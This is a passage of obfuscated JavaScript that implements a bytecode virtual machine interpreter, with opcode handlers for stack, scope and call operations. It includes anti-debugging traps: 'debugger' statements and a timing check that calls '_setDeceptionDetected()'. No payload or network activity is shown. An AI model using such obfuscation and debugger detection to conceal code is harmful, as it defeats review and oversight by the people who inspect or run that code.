No=ja[--jn],Nt=ja[--jn],Nk=ja[jn-0x1];vmZ(Nk,Nt,{'set':No,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xb5:{yO:{let NT=ja[--jn],NX=ja[--jn],NL=ja[jn-0x1];vmZ(NL,NX,{'value':NT,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa7:{yz:{if(CZ===-0x1)ja[jn++]=Symbol();else{let NR=ja[--jn];ja[jn++]=Symbol(NR);}jw++;}break;}}},Ci=function(Cb,CZ){switch(Cb){case 0xdd:{lG:{let CG=CZ&0xffff,Cv=CZ>>>0x10,CS=jJ[CG],CD=CE['_$UP7JxF'];for(let CK=0x0;CK<Cv;CK++){CD=CD['_$IYp3QS'];}let CB=CD['_$k25D7l'];if(CB&&CS in CB)throw new ReferenceError('Cannot\x20access\x20\x27'+CS+'\x27\x20before\x20initialization');let CF=CD['_$9omHYP'];ja[jn++]=CF?CF[CS]:undefined,jw++;}break;}case 0xdb:{lv:{let CQ=jJ[CZ],Cr=ja[--jn],CA=CE['_$UP7JxF']['_$IYp3QS'];CA&&(!CA['_$9omHYP']&&(CA['_$9omHYP']=vmY(null)),CA['_$9omHYP'][CQ]=Cr),jw++;}break;}case 0xd6:{lS:{CE['_$UP7JxF']&&CE['_$UP7JxF']['_$IYp3QS']&&(CE['_$UP7JxF']=CE['_$UP7JxF']['_$IYp3QS']),jw++;}break;}case 0xd2:{lD:{let Ca=ja[--jn],Cn={['_$9omHYP']:null,['_$o3JtVK']:null,['_$k25D7l']:null,['_$IYp3QS']:Ca};CE['_$UP7JxF']=Cn,jw++;}break;}case 0xfd:{lB:{let Cq=CZ&0xffff,Cw=CZ>>>0x10;ja[jn++]=jq[Cq]-jJ[Cw],jw++;}break;}case 0xfa:{lF:{jq[CZ]=jq[CZ]+0x1,jw++;}break;}case 0xfb:{lK:{jq[CZ]=jq[CZ]-0x1,jw++;}break;}case 0x10f:{lQ:{if(typeof process!=='undefined'&&process['hrtime']&&process['hrtime']['bigint']){var CY=process['hrtime']['bigint']();debugger;if(Number(process['hrtime']['bigint']()-CY)/0xf4240>0.1)try{_setDeceptionDetected();}catch(CJ){}}jw++;}break;}case 0x100:{lr:{let Cs=CZ&0xffff,CI=CZ>>>0x10;ja[jn++]=jq[Cs]<jJ[CI],jw++;}break;}case 0xc8:{lA:{debugger;jw++;}break;}case 0x103:{la:{jq[CZ]=ja[--jn],jw++;}break;}case 0xc9:{ln:{jw++;}break;}case 0x104:{lq:{let CW=jq[CZ]+0x1;jq[CZ]=CW,ja[jn++]=CW,jw++;}break;}case 0xd5:{lw:{ja[jn++]=CE['_$UP7JxF'],jw++;}break;}case 0xff:{lJ:{let Cu=CZ&0xffff,CO=CZ>>>0x10,Cz=jq[Cu],Co=jJ[CO];ja[jn++]=Cz[Co],jw++;}break;}case 0x101:{ls:{let Ct=CZ&0xffff,Ck=CZ>>>0x10;jq[Ct]<jJ[Ck]?jw=jI[jw]:jw++;}break;}case 0xfc:{lI:{let CT=CZ&0xffff,CX=CZ>>>0x10;ja[jn++]=jq[CT]+jJ[CX],jw++;}break;}case 0xd7:{lW:{let CL=jJ[CZ],CR=ja[--jn];K(CE['_$UP7JxF'],CL),!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP'][CL]=CR,jw++;}break;}case 0xd9:{lu:{let Cm=jJ[CZ],CV=ja[--jn];K(CE['_$UP7JxF'],Cm);if(!CE['_$UP7JxF']['_$9omHYP'])CE['_$UP7JxF']['_$9omHYP']=vmY(null);CE['_$UP7JxF']['_$9omHYP'][Cm]=CV,!CE['_$UP7JxF']['_$o3JtVK']&&(CE['_$UP7JxF']['_$o3JtVK']=vmY(null)),CE['_$UP7JxF']['_$o3JtVK'][Cm]=!![],jw++;}break;}case 0x102:{lO:{let CH=CZ&0xffff,CP=CZ>>>0x10,Ce=ja[--jn],Ch=G(C2,Ce),Cc=jq[CH],Cp=jJ[CP],l0=Cc[Cp];ja[jn++]=l0['apply'](Cc,Ch),jw++;}break;}case 0x105:{lz:{let l1=jq[CZ]-0x1;jq[CZ]=l1,ja[jn++]=l1,jw++;}break;}case 0xd3:{lo:{let l2=jJ[CZ];if(l2==='__this__'){let l8=CE['_$UP7JxF'];while(l8){if(l8['_$k25D7l']&&'__this__'in l8['_$k25D7l'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(l8['_$9omHYP']&&'__this__'in l8['_$9omHYP'])break;l8=l8['_$IYp3QS'];}ja[jn++]=jA,jw++;break lo;}let l3=CE['_$UP7JxF'],l4,l5=![],l6=l2['indexOf']('$$'),l7=l6!==-0x1?l2['substring'](0x0,l6):null;while(l3){let l9=l3['_$k25D7l'],lj=l3['_$9omHYP'];if(l9&&l2 in l9)throw new ReferenceError('Cannot\x20access\x20\x27'+l2+'\x27\x20before\x20initialization');if(l7&&l9&&l7 in l9){if(!(lj&&l2 in lj))throw new ReferenceError('Cannot\x20access\x20\x27'+l7+'\x27\x20before\x20initialization');}if(lj&&l2 in lj){l4=lj[l2],l5=!![];break;}l3=l3['_$IYp3QS'];}!l5&&(l2 in vmg_717f62?l4=vmg_717f62[l2]:l4=vmd[l2]),ja[jn++]=l4,jw++;}break;}case 0xdc:{lt:{let lC=ja[--jn],ll=jJ[CZ];if(CE['_$wPHaOR']&&!(ll in vmd)&&!(ll in vmg_717f62))throw new ReferenceError(ll+'\x20is\x20not\x20defined');vmg_717f62[ll]=lC,vmd[ll]=lC,ja[jn++]=lC,jw++;}break;}case 0xd4:{lk:{let lE=jJ[CZ],lN=ja[--jn],ly=CE['_$UP7JxF'],lx=![];while(ly){let li=ly['_$k25D7l'],lg=ly['_$9omHYP'];if(li&&lE in li)throw new ReferenceError('Cannot\x20access\x20\x27'+lE+'\x27\x20before\x20initialization');if(lg&&lE in lg){if(ly['_$V80HSn']&&lE in ly['_$V80HSn']){if(CE['_$wPHaOR'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lx=!![];break;}if(ly['_$o3JtVK']&&lE in ly['_$o3JtVK'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lg[lE]=lN,lx=!![];break;}ly=ly['_$IYp3QS'];}if(!lx){if(lE in vmg_717f62)vmg_717f62[lE]=lN;else lE in vmd?vmd[lE]=lN:vmd[lE]=lN;}jw++;}break;}case 0xda:{lT:{let lf=jJ[CZ];!CE['_$UP7JxF']['_$k25D7l']&&(CE['_$UP7JxF']['_$k25D7l']=vmY(null)),CE['_$UP7JxF']['_$k25D7l'][lf]=!![],jw++;}break;}case 0xfe:{lX:{let lU=CZ&0xffff,ld=CZ>>>0x10;ja[jn++]=jq[lU]*jJ[ld],jw++;}break;}case 0xd8:{lL:{let lM=jJ[CZ],lb=ja[--jn],lZ=CE['_$UP7JxF'],lY=![];while(lZ){if(lZ['_$9omHYP']&&lM in lZ['_$9omHYP']){if(lZ['_$o3JtVK']&&lM in lZ['_$o3JtVK'])break;lZ['_$9omHYP'][lM]=lb;!lZ['_$o3JtVK']&&(lZ['_$o3JtVK']=vmY(null));lZ['_$o3JtVK'][lM]=!![],lY=!![];break;}lZ=lZ['_$IYp3QS'];}!lY&&(Q(CE['_$UP7JxF'],lM),!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP'][lM]=lb,!CE['_$UP7JxF']['_$o3JtVK']&&(CE['_$UP7JxF']['_$o3JtVK']=vmY(null)),CE['_$UP7JxF']['_$o3JtVK'][lM]=!![]),jw++;}break;}case 0xca:{lR:{return Cl=jn>0x0?ja[--jn]:undefined,0x1;}break;}case 0x10e:{lm:{debugger;jw++;}break;}}});switch(Cd){case 0x0:{ja[jn++]=jJ[CM],jw++;continue;}case 0x48:{let Cb=ja[--jn],CZ=ja[--jn];if(CZ===null||CZ===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(Cb)+'\x27\x20of\x20'+CZ);ja[jn++]=CZ[Cb],jw++;continue;}case 0x4:{let CY=ja[jn-0x1];ja[jn++]=CY,jw++;continue;}case 0x10:{let CG=ja[--jn];ja[jn++]=typeof CG===f?CG+0x1n:+CG+0x1,jw++;continue;}case 0x2c:{let Cv=ja[--jn],CS=ja[--jn];ja[jn++]=CS<Cv,jw++;continue;}case 0x6:{ja[jn++]=jq[CM],jw++;continue;}case 0x34:{!ja[--jn]?jw=jI[jw]:jw++;continue;}case 0x8:{ja[jn++]=jF[CM],jw++;continue;}case 0x7:{jq[CM]=ja[--jn],jw++;continue;}case 0x32:{jw=jI[jw];continue;}case 0x2e:{let CD=ja[--jn],CB=ja[--jn];ja[jn++]=CB>CD,jw++;continue;}case 0x1:{ja[jn++]=undefined,jw++;continue;}case 0x49:{let CF=ja[--jn],CK=ja[--jn],CQ=ja[--jn];if(CQ===null||CQ===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(CK)+'\x27\x20of\x20'+CQ);if(jP){if(!Reflect['set'](CQ,CK,CF))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(CK)+'\x27\x20of\x20object');}else CQ[CK]=CF;ja[jn++]=CF,jw++;continue;}case 0xb:{let Cr=ja[--jn],CA=ja[--jn];ja[jn++]=CA-Cr,jw++;continue;}case 0x3:{ja[--jn],jw++;continue;}case 0x1c:{let Ca=ja[--jn];ja[jn++]=typeof Ca===f?Ca:+Ca,jw++;continue;}case 0xa:{let Cn=ja[--jn],Cq=ja[--jn];ja[jn++]=Cq+Cn,jw++;continue;}}CE=CC;if(Cd<0x5a){if(Cy(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}else{if(Cd<0xc8){if(Cx(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}else{if(Ci(Cd,CM)){if(Cj>0x0){CN();continue;}return Cl;}}}C4=CC['_$UP7JxF'],C7=CC['_$LXelx5'];}break;}catch(Cw){if(jk&&jk['length']>0x0){let CJ=jk[jk['length']-0x1];jn=CJ['_$jcGxNK'];if(CJ['_$lQFkUz']!==undefined)C1(Cw),jw=CJ['_$lQFkUz'],CJ['_$lQFkUz']=undefined,CJ['_$vKxByc']===undefined&&jk['pop']();else CJ['_$vKxByc']!==undefined?(jw=CJ['_$vKxByc'],CJ['_$Bn3NBW']=Cw):(jw=CJ['_$lhqrKM'],jk['pop']());continue;}throw Cw;}}return jn>0x0?ja[--jn]:C7?jA:undefined;}function t(jB,jF,jK,jQ,jr,jA){let ja=new Array(0x8),jn=0x0,jq=new Array((jB[0xb]||0x0)+(jB[0xd]||0x0)),jw=0x0,jJ=jB[0x2],js=jB[0xc],jI=jB[0x13]||U,jW=jB[0xe]||U,ju=js['length']>>0x1,jO=(jB[0xb]*0x1f^jB[0xd]*0x11^ju*0xd^jJ['length']*0x7)>>>0x0&0x3,jz,jo,jt;switch(jO){case 0x1:jz=0x1,jo=0x0,jt=0x1;break;case 0x2:jz=0x0,jo=ju,jt=0x0;break;case 0x3:jz=ju,jo=0x0,jt=0x0;break;default:jz=0x0,jo=0x1,jt=0x1;break;}let jk=null,jT=null,jX=![],jL=undefined,jR=![],jm=0x0,jV=![],jH=0x0,jP=!!jB[0x1],je=!!jB[0x8],jh=!!jB[0x3],jc=!!jB[0x5],jp=jA,C0=!!jB[0x4];!jP&&!C0&&(jA===undefined||jA===null)&&(jA=vmd);let C1=jB[0x11],C2,C3,C4,C5,C6,C7;if(C1!==undefined){let Cg=Cf=>typeof Cf==='number'&&(Cf|0x0)===Cf&&!Object['is'](Cf,-0x0)?Cf^C1|0x0:Cf;C2=Cf=>{ja[jn++]=Cg(Cf);},C3=()=>Cg(ja[--jn]),C4=()=>Cg(ja[jn-0x1]),C5=Cf=>{ja[jn-0x1]=Cg(Cf);},C6=Cf=>Cg(ja[jn-Cf]),C7=(Cf,CU)=>{ja[jn-Cf]=Cg(CU);};}else C2=Cf=>{ja[jn++]=Cf;},C3=()=>ja[--jn],C4=()=>ja[jn-0x1],C5=Cf=>{ja[jn-0x1]=Cf;},C6=Cf=>ja[jn-Cf],C7=(Cf,CU)=>{ja[jn-Cf]=CU;};let C8=Cf=>Cf,C9={['_$9omHYP']:null,['_$o3JtVK']:null,['_$k25D7l']:null,['_$IYp3QS']:jK};if(jF){let Cf=jB[0xb]||0x0;for(let CU=0x0,Cd=jF['length']<Cf?jF['length']:Cf;CU<Cd;CU++){jq[CU]=jF[CU];}}let Cj=(jP||!je)&&jF?S(jF):null,CC=null,Cl=![],CE=jq['length'],CN=null,Cy=0x0;jc&&(C9['_$k25D7l']=vmY(null),C9['_$k25D7l']['__this__']=!![]);n(jB,C9,jQ);let Cx={['_$wPHaOR']:jP,['_$7AWJXJ']:je,['_$cEXkWi']:jh,['_$lGK2nA']:jc,['_$LXelx5']:Cl,['_$LX6iYq']:jp,['_$mncnwJ']:Cj,['_$UP7JxF']:C9};function Ci(CM,Cb){if(CM===0x1)C2(Cb);else{if(CM===0x2){if(jk&&jk['length']>0x0){let CB=jk[jk['length']-0x1];jn=CB['_$jcGxNK'];if(CB['_$lQFkUz']!==undefined){C2(Cb),jw=CB['_$lQFkUz'],CB['_$lQFkUz']=undefined;if(CB['_$vKxByc']===undefined)jk['pop']();}else CB['_$vKxByc']!==undefined?(jw=CB['_$vKxByc'],CB['_$Bn3NBW']=Cb):(jw=CB['_$lhqrKM'],jk['pop']());}else throw Cb;}else{if(CM===0x3){let CF=Cb;if(jk&&jk['length']>0x0){let CK=jk[jk['length']-0x1];if(CK['_$vKxByc']!==undefined)jX=!![],jL=CF,jw=CK['_$vKxByc'];else return CF;}else return CF;}}}while(jw<ju){try{while(jw<ju){let CQ=js[jz+(jw<<jt)],Cr=js[jo+(jw<<jt)];if(CQ===g){let CA=C3();return jw++,{['_$bh7Fvy']:l,['_$pfe8lb']:CA,'_d':Ci};}if(CQ===x){let Ca=C3();return jw++,{['_$bh7Fvy']:E,['_$pfe8lb']:Ca,'_d':Ci};}if(CQ===i){let Cn=C3();return jw++,{['_$bh7Fvy']:N,['_$pfe8lb']:Cn,'_d':Ci};}var CZ,CY,CG,Cv,CS,CD;!Cv&&(CY=null,CG=function(){for(let Cq=CE-0x1;Cq>=0x0;Cq--){jq[Cq]=CN[--Cy];}C9=CN[--Cy],Cx['_$UP7JxF']=C9,Cj=CN[--Cy],Cx['_$mncnwJ']=Cj,CC=CN[--Cy],jF=CN[--Cy],jn=CN[--Cy],jw=CN[--Cy],ja[jn++]=CZ,jw++;},Cv=function(Cq,Cw){switch(Cq){case 0x5:{Ew:{let CJ=ja[jn-0x1];ja[jn-0x1]=ja[jn-0x2],ja[jn-0x2]=CJ,jw++;}break;}case 0x33:{EJ:{ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x3a:{Es:{let Cs=jW[jw];if(!jk)jk=[];jk['push']({['_$lQFkUz']:Cs[0x0]>=0x0?Cs[0x0]:undefined,['_$vKxByc']:Cs[0x1]>=0x0?Cs[0x1]:undefined,['_$lhqrKM']:Cs[0x2]>=0x0?Cs[0x2]:undefined,['_$jcGxNK']:jn}),jw++;}break;}case 0x2d:{EI:{let CI=ja[--jn],CW=ja[--jn];ja[jn++]=CW<=CI,jw++;}break;}case 0x18:{EW:{let Cu=ja[--jn],CO=ja[--jn];ja[jn++]=CO<<Cu,jw++;}break;}case 0x7:{Eu:{jq[Cw]=ja[--jn],jw++;}break;}case 0x4d:{EO:{ja[jn++]={},jw++;}break;}case 0xa:{Ez:{let Cz=ja[--jn],Co=ja[--jn];ja[jn++]=Co+Cz,jw++;}break;}case 0x11:{Eo:{let Ct=ja[--jn];ja[jn++]=typeof Ct===f?Ct-0x1n:+Ct-0x1,jw++;}break;}case 0x4a:{Et:{let Ck,CT;Cw!=null?(CT=ja[--jn],Ck=jJ[Cw]):(Ck=ja[--jn],CT=ja[--jn]);let CX=delete CT[Ck];if(CY['_$wPHaOR']&&!CX)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(Ck)+'\x27\x20of\x20object');ja[jn++]=CX,jw++;}break;}case 0x6:{Ek:{ja[jn++]=jq[Cw],jw++;}break;}case 0x2f:{ET:{let CL=ja[--jn],CR=ja[--jn];ja[jn++]=CR>=CL,jw++;}break;}case 0x36:{EX:{let Cm=ja[--jn],CV=ja[--jn];if(typeof CV!=='function')throw new TypeError(CV+'\x20is\x20not\x20a\x20function');let CH=vmg_717f62['_$RycY0U'],CP=!vmg_717f62['_$yi8Vf9']&&!vmg_717f62['_$L4iaoq']&&!(CH&&CH['get'](CV))&&Z['get'](CV);if(CP){let l0=CP['c']||(CP['c']=typeof CP['b']==='object'?CP['b']:jv(CP['b']));if(l0){let l1;if(Cm===0x0)l1=[];else{if(Cm===0x1){let l3=ja[--jn];l1=l3&&typeof l3==='object'&&M['has'](l3)?l3['value']:[l3];}else l1=G(C3,Cm);}let l2=l0[0xa];if(l2&&l0===jB&&!l0[0xe]&&CP['e']===jK){!CN&&(CN=[]);CN[Cy++]=jw,CN[Cy++]=jn,CN[Cy++]=jF,CN[Cy++]=CC,CN[Cy++]=Cj,CN[Cy++]=C9;for(let l4=0x0;l4<CE;l4++){CN[Cy++]=jq[l4];}jF=l1,CC=null;if(l0[0x8]){Cj=null;let l5=l0[0xb]||0x0;for(let l6=0x0;l6<l5&&l6<l1['length'];l6++){jq[l6]=l1[l6];}for(let l7=l1['length']<l5?l1['length']:l5;l7<CE;l7++){jq[l7]=undefined;}jw=l2;}else{Cj=S(l1),Cx['_$mncnwJ']=Cj;for(let l8=0x0;l8<CE;l8++){jq[l8]=undefined;}jw=0x0;}break EX;}vmg_717f62['_$m7f5kZ']?vmg_717f62['_$m7f5kZ']=![]:vmg_717f62['_$yi8Vf9']=undefined;ja[jn++]=o(l0,l1,CP['e'],CV,undefined,undefined),jw++;break EX;}}let Ce=vmg_717f62['_$yi8Vf9'],Ch=vmg_717f62['_$RycY0U'],Cc=Ch&&Ch['get'](CV);Cc?(vmg_717f62['_$m7f5kZ']=!![],vmg_717f62['_$yi8Vf9']=Cc):vmg_717f62['_$yi8Vf9']=undefined;let Cp;try{if(Cm===0x0)Cp=CV();else{if(Cm===0x1){let l9=ja[--jn];Cp=l9&&typeof l9==='object'&&M['has'](l9)?vmQ(CV,undefined,l9['value']):CV(l9);}else Cp=vmQ(CV,undefined,G(C3,Cm));}ja[jn++]=Cp;}finally{Cc&&(vmg_717f62['_$m7f5kZ']=![]),vmg_717f62['_$yi8Vf9']=Ce;}jw++;}break;}case 0x3d:{EL:{if(jk&&jk['length']>0x0){let lj=jk[jk['length']-0x1];lj['_$vKxByc']===jw&&(lj['_$Bn3NBW']!==undefined&&(jT=lj['_$Bn3NBW']),jk['pop']());}jw++;}break;}case 0x4e:{ER:{let lC=ja[--jn],ll=jJ[Cw];lC===null||lC===undefined?ja[jn++]=undefined:ja[jn++]=lC[ll],jw++;}break;}case 0x39:{Em:{throw ja[--jn];}break;}case 0x35:{EV:{let lE=ja[--jn];lE!==null&&lE!==undefined?jw=jI[jw]:jw++;}break;}case 0x3c:{EH:{let lN=ja[--jn];if(Cw!=null){let ly=jJ[Cw];!CY['_$UP7JxF']['_$9omHYP']&&(CY['_$UP7JxF']['_$9omHYP']=vmY(null)),CY['_$UP7JxF']['_$9omHYP'][ly]=lN;}jw++;}break;}case 0x2e:{EP:{let lx=ja[--jn],li=ja[--jn];ja[jn++]=li>lx,jw++;}break;}case 0x4c:{Ee:{let lg=ja[--jn],lf=jJ[Cw];if(vmg_717f62['_$5efjzU']&&lf in vmg_717f62['_$5efjzU'])throw new ReferenceError('Cannot\x20access\x20\x27'+lf+'\x27\x20before\x20initialization');let lU=!(lf in vmg_717f62)&&!(lf in vmd);vmg_717f62[lf]=lg,lf in vmd&&(vmd[lf]=lg),lU&&(vmd[lf]=lg),ja[jn++]=lg,jw++;}break;}case 0x17:{Eh:{ja[jn-0x1]=~ja[jn-0x1],jw++;}break;}case 0x37:{Ec:{let ld=ja[--jn],lM=ja[--jn],lb=ja[--jn];if(typeof lM!=='function')throw new TypeError(lM+'\x20is\x20not\x20a\x20function');let lZ=vmg_717f62['_$RycY0U'],lY=lZ&&lZ['get'](lM),lG=vmg_717f62['_$yi8Vf9'];lY&&(vmg_717f62['_$m7f5kZ']=!![],vmg_717f62['_$yi8Vf9']=lY);let lv;try{if(ld===0x0)lv=vmQ(lM,lb,[]);else{if(ld===0x1){let lS=ja[--jn];lv=lS&&typeof lS==='object'&&M['has'](lS)?vmQ(lM,lb,lS['value']):vmQ(lM,lb,[lS]);}else lv=vmQ(lM,lb,G(C3,ld));}ja[jn++]=lv;}finally{lY&&(vmg_717f62['_$m7f5kZ']=![],vmg_717f62['_$yi8Vf9']=lG);}jw++;}break;}case 0x20:{Ep:{ja[jn-0x1]=!ja[jn-0x1],jw++;}break;}case 0x16:{N0:{let lD=ja[--jn],lB=ja[--jn];ja[jn++]=lB^lD,jw++;}break;}case 0x3f:{N1:{let lF=jI[jw];if(jk&&jk['length']>0x0){let lK=jk[jk['length']-0x1];if(lK['_$vKxByc']!==undefined&&lF>=lK['_$lhqrKM']){jR=!![],jm=lF,jw=lK['_$vKxByc'];break N1;}}jw=lF;}break;}case 0x47:{N2:{let lQ=ja[--jn],lr=ja[--jn],lA=jJ[Cw];if(lr===null||lr===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(lA)+'\x27\x20of\x20'+lr);if(CY['_$wPHaOR']){if(!Reflect['set'](lr,lA,lQ))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(lA)+'\x27\x20of\x20object');}else lr[lA]=lQ;ja[jn++]=lQ,jw++;}break;}case 0x15:{N3:{let la=ja[--jn],ln=ja[--jn];ja[jn++]=ln|la,jw++;}break;}case 0x49:{N4:{let lq=ja[--jn],lw=ja[--jn],lJ=ja[--jn];if(lJ===null||lJ===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(lw)+'\x27\x20of\x20'+lJ);if(CY['_$wPHaOR']){if(!Reflect['set'](lJ,lw,lq))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(lw)+'\x27\x20of\x20object');}else lJ[lw]=lq;ja[jn++]=lq,jw++;}break;}case 0x53:{N5:{let ls=ja[--jn],lI=ja[--jn],lW=jJ[Cw];vmZ(lI,lW,{'value':ls,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof ls==='function'&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](ls,lI)),jw++;}break;}case 0x28:{N6:{let lu=ja[--jn],lO=ja[--jn];ja[jn++]=lO==lu,jw++;}break;}case 0x14:{N7:{let lz=ja[--jn],lo=ja[--jn];ja[jn++]=lo&lz,jw++;}break;}case 0x3b:{N8:{jk['pop'](),jw++;}break;}case 0x9:{N9:{jF[Cw]=ja[--jn],jw++;}break;}case 0xb:{Nj:{let lt=ja[--jn],lk=ja[--jn];ja[jn++]=lk-lt,jw++;}break;}case 0x46:{NC:{let lT=ja[--jn],lX=jJ[Cw];if(lT===null||lT===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(lX)+'\x27\x20of\x20'+lT);ja[jn++]=lT[lX],jw++;}break;}case 0x12:{Nl:{let lL=ja[--jn],lR=ja[--jn];ja[jn++]=lR**lL,jw++;}break;}case 0x40:{NE:{let lm=jI[jw];if(jk&&jk['length']>0x0){let lV=jk[jk['length']-0x1];if(lV['_$vKxByc']!==undefined&&lm>=lV['_$lhqrKM']){jV=!![],jH=lm,jw=lV['_$vKxByc'];break NE;}}jw=lm;}break;}case 0x1:{NN:{ja[jn++]=undefined,jw++;}break;}case 0x38:{Ny:{if(jk&&jk['length']>0x0){let lH=jk[jk['length']-0x1];if(lH['_$vKxByc']!==undefined){jX=!![],jL=ja[--jn],jw=lH['_$vKxByc'];break Ny;}}return jX&&(jX=![],jL=undefined),CZ=ja[--jn],0x1;}break;}case 0x34:{Nx:{!ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x2:{Ni:{ja[jn++]=null,jw++;}break;}case 0x8:{Ng:{ja[jn++]=jF[Cw],jw++;}break;}case 0x32:{Nf:{jw=jI[jw];}break;}case 0x1c:{NU:{let lP=ja[--jn];ja[jn++]=typeof lP===f?lP:+lP,jw++;}break;}case 0x54:{Nd:{let le=ja[--jn],lh=ja[--jn],lc=ja[--jn];vmZ(lc,lh,{'value':le,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof le==='function'&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](le,lc)),jw++;}break;}case 0x2b:{NM:{let lp=ja[--jn],E0=ja[--jn];ja[jn++]=E0!==lp,jw++;}break;}case 0x51:{Nb:{let E1=ja[--jn],E2=ja[jn-0x1];E1!==null&&E1!==undefined&&Object['assign'](E2,E1),jw++;}break;}case 0xe:{NZ:{let E3=ja[--jn],E4=ja[--jn];ja[jn++]=E4%E3,jw++;}break;}case 0x1a:{NY:{let E5=ja[--jn],E6=ja[--jn];ja[jn++]=E6>>>E5,jw++;}break;}case 0x1b:{NG:{let E7=ja[jn-0x3],E8=ja[jn-0x2],E9=ja[jn-0x1];ja[jn-0x3]=E8,ja[jn-0x2]=E9,ja[jn-0x1]=E7,jw++;}break;}case 0x52:{Nv:{let Ej=ja[--jn],EC=ja[--jn];EC===null||EC===undefined?ja[jn++]=undefined:ja[jn++]=EC[Ej],jw++;}break;}case 0xd:{NS:{let El=ja[--jn],EE=ja[--jn];ja[jn++]=EE/El,jw++;}break;}case 0x13:{ND:{ja[jn-0x1]=+ja[jn-0x1],jw++;}break;}case 0x48:{NB:{let EN=ja[--jn],Ey=ja[--jn];if(Ey===null||Ey===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(EN)+'\x27\x20of\x20'+Ey);ja[jn++]=Ey[EN],jw++;}break;}case 0x29:{NF:{let Ex=ja[--jn],Ei=ja[--jn];ja[jn++]=Ei!=Ex,jw++;}break;}case 0x4f:{NK:{let Eg=ja[--jn],Ef=ja[--jn];ja[jn++]=Ef in Eg,jw++;}break;}case 0x4b:{NQ:{let EU=jJ[Cw],Ed;if(vmg_717f62['_$5efjzU']&&EU in vmg_717f62['_$5efjzU'])throw new ReferenceError('Cannot\x20access\x20\x27'+EU+'\x27\x20before\x20initialization');if(EU in vmg_717f62)Ed=vmg_717f62[EU];else{if(EU in vmd)Ed=vmd[EU];else throw new ReferenceError(EU+'\x20is\x20not\x20defined');}ja[jn++]=Ed,jw++;}break;}case 0x3:{Nr:{ja[--jn],jw++;}break;}case 0x0:{NA:{ja[jn++]=jJ[Cw],jw++;}break;}case 0xc:{Na:{let EM=ja[--jn],Eb=ja[--jn];ja[jn++]=Eb*EM,jw++;}break;}case 0x19:{Nn:{let EZ=ja[--jn],EY=ja[--jn];ja[jn++]=EY>>EZ,jw++;}break;}case 0x3e:{Nq:{if(jT!==null){jX=![],jR=![],jV=![];let EG=jT;jT=null;throw EG;}if(jX){if(jk&&jk['length']>0x0){let ES=jk[jk['length']-0x1];if(ES['_$vKxByc']!==undefined){jw=ES['_$vKxByc'];break Nq;}}let Ev=jL;return jX=![],jL=undefined,CZ=Ev,0x1;}if(jR){if(jk&&jk['length']>0x0){let EB=jk[jk['length']-0x1];if(EB['_$vKxByc']!==undefined){jw=EB['_$vKxByc'];break Nq;}}let ED=jm;jR=![],jm=0x0,jw=ED;break Nq;}if(jV){if(jk&&jk['length']>0x0){let EK=jk[jk['length']-0x1];if(EK['_$vKxByc']!==undefined){jw=EK['_$vKxByc'];break Nq;}}let EF=jH;jV=![],jH=0x0,jw=EF;break Nq;}jw++;}break;}case 0x2a:{Nw:{let EQ=ja[--jn],Er=ja[--jn];ja[jn++]=Er===EQ,jw++;}break;}case 0x10:{NJ:{let EA=ja[--jn];ja[jn++]=typeof EA===f?EA+0x1n:+EA+0x1,jw++;}break;}case 0x4:{Ns:{let Ea=ja[jn-0x1];ja[jn++]=Ea,jw++;}break;}case 0x2c:{NI:{let En=ja[--jn],Eq=ja[--jn];ja[jn++]=Eq<En,jw++;}break;}case 0x1d:{NW:{ja[jn-0x1]=String(ja[jn-0x1]),jw++;}break;}case 0xf:{Nu:{ja[jn-0x1]=-ja[jn-0x1],jw++;}break;}}},CS=function(Cq,Cw){switch(Cq){case 0x6f:{y7:{let Cs=ja[--jn],CI=ja[--jn];ja[jn++]=CI instanceof Cs,jw++;}break;}case 0xa2:{y8:{let CW=Cw&0xffff,Cu=Cw>>0x10,CO=jJ[CW],Cz=jJ[Cu];ja[jn++]=new RegExp(CO,Cz),jw++;}break;}case 0xa6:{y9:{ja[jn++]=vmb[Cw],jw++;}break;}case 0xa3:{yj:{ja[--jn],ja[jn++]=undefined,jw++;}break;}case 0x7b:{yC:{let Co=ja[--jn],Ct=Co['next']();ja[jn++]=Ct,jw++;}break;}case 0xb7:{yl:{let Ck=ja[--jn],CT=ja[--jn],CX=ja[jn-0x1],CL=D(CX);vmZ(CL,CT,{'set':Ck,'enumerable':CL===CX,'configurable':!![]}),jw++;}break;}case 0x68:{yE:{let CR=ja[--jn],Cm=G(C3,CR),CV=ja[--jn];if(typeof CV!=='function')throw new TypeError(CV+'\x20is\x20not\x20a\x20constructor');if(b['has'](CV))throw new TypeError(CV['name']+'\x20is\x20not\x20a\x20constructor');let CH=vmg_717f62['_$yi8Vf9'];vmg_717f62['_$yi8Vf9']=undefined;let CP;try{CP=Reflect['construct'](CV,Cm);}finally{vmg_717f62['_$yi8Vf9']=CH;}ja[jn++]=CP,jw++;}break;}case 